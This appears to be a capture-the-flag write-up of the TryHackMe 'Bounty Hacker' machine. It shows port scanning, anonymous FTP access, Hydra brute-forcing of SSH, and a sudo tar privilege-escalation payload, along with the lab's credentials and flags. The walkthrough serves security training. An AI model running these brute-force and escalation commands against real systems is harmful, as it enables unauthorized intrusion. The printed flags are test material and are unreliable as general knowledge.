# Lab Report - Bounty Hacker


# Overview 
- **Date**: 04/10/2025
- **Category**: Web, FTP
- **Difficulty**: Easy 
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/cowboyhacker
- **Tags**: #enumeration #Brute-force #services #privesc 

## Challenge Description 
>**- An easy boot-to-root machine.** 

## Resolution Summary 
>**We enumerated services using `Nmap`. Next we found an FTP server with Anonymous login enable, which contained information that allowed us to perform a brute-force attack on the SSH server. Finally, we escalated our privileges through misconfigured sudo permissions, involving the`tar` binary.**

# Information Gathering 
## Active Reconnaissance 
- **As we were given an IP address, we  started by performing an `Nmap` port scan, we  scanned for services' version in order to uncover potential version-related vulnerabilities.** 
```bash
sudo nmap -sV 10.10.181.45
```
- Note: adding the `-p-` flag did not reveal additional information. 

- **We got the following results from the `Nmap` scan:**
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- **Here we discovered several attack vectors to investigate, we started by the web application.** 
### HTTP (80)
- **For starters, we  ran `GoBuster` in order to discover hidden directories. We used SecList's medium list for this task:**
```bash
gobuster dir -u 10.10.181.45 -w 
/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
```

- **While the previous command was running, we took a look at the web, and particularly the source code since there was not much to it. However, we did not find anything relevant.**

- **We got the following results from `GoBuster`:**
```bash
/images               (Status: 301) [Size: 313] [--> http://10.10.181.45/images/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.181.45/javascript/]
/server-status        (Status: 403) [Size: 277]
```

- **Just in case, we uploaded the only image available and checked its metadata for hidden information using `exiftool`:** 
```bash
exiftool crew.png
```
- Note: it did not lead to any relevant track. 

- **Since there was not anything left to the web application, we proceeded to save the  usernames we encountered since we will be targeting the FTP and SSH server next:** 
```bash
Spike (the one supposed to hack the system), Jet, Ed, Faye, Edward, Ein.
```

### FTP (21)
- **Next,  we headed straight to the FTP server. We connected to it using the `ftp` command:** 
```bash
ftp 10.10.181.45
```

- **One of the first reflexes we should have here is to attempt Anonymous login, which succeeded in this case.** 
- **Another reflex would be to use `help` to list the available commands:**
```bash
ftp> help
```

- **Upon further investigation, we encounter two .txt files, `locks.txt` and `task.txt`**
- **The `locks.txt` file was formatted similar to a wordlist (containing passwords here), hence it may become handy when trying to brute-force  SSH credentials.** 
- **The `task.txt` file revealed the following message, which provided us with more usernames to test when brute-forcing the SSH server:** 
```bash
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
# Exploitation 
- **Now that we were done with the enumeration step, we attempted to brute-force the SSH server with the wordlist we recovered (`locks.txt`). For this task we used  `Hydra`.**
- **First, we made a a user list with all the usernames we found up until now. Subsequently, we proceeded by using `Hydra`:** 
```bash
hydra -L userlist.txt -P wordlist.txt ssh://10.10.181.45 
```

- **We found a valid pair of credentials :**
```bash
[DATA] attacking ssh://10.10.181.45:22/
[22][ssh] host: 10.10.181.45   login: lin   password: RedDr4gonSynd1cat3
```

- **Which allowed us to gain access to the SSH server (22) by using:** 
```bash
ssh lin@10.10.181.45
```

- **Upon logging in, we were greeted by the first flag:** 
	- **user.txt -> `THM{CR1M3_SyNd1C4T3}`.

# Privilege Escalation 
- **Our goal here was to find a way to escalate our privileges and access the final flag.**
- **For started, we tried to see which command we could possibly use with sudo:**
```bash
sudo -l
```

- **And here was the result:** 
```bash
User lin may run the following commands on ip-10-10-181-45:
    (root) /bin/tar
```

- **Once we found this clue, we directly went to check on [GTFOBins](https://gtfobins.github.io/) for privileges escalation vectors.** 
- **We found the following payload to use:** 
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- **We confirmed that the attempt was successful by using:**
```bash 
whoami
root #Result
```

- **Finally, we were able to access the final flag:**
```bash
find / -type f -name "root.txt" 
cat /root/root.txt
THM{80UN7Y_h4cK3r}
```
# Trophy 
**User.txt → `THM{CR1M3_SyNd1C4T3}`**

**Root.txt → `THM{80UN7Y_h4cK3r}`**

# Remediation Summary
- **Anonymous login:** It should be disable to reinforce authentication on FTP servers.  
- **Storing passwords in cleartext:** Passwords can be safely stored using trusted password managers. 
- **Misconfigured sudo permissions:**  Sudo usage should be restricted to essential commands only. 
# Lessons Learned
- **Any piece of information can be useful:** Saving usernames to make a wordlist was proven to be useful, as it permitted to successfully brute-force the SSH login credentials. 
- **GTFOBins in privesc**: Checking GTFOBins allows you to transform your findings into practical exploits. 
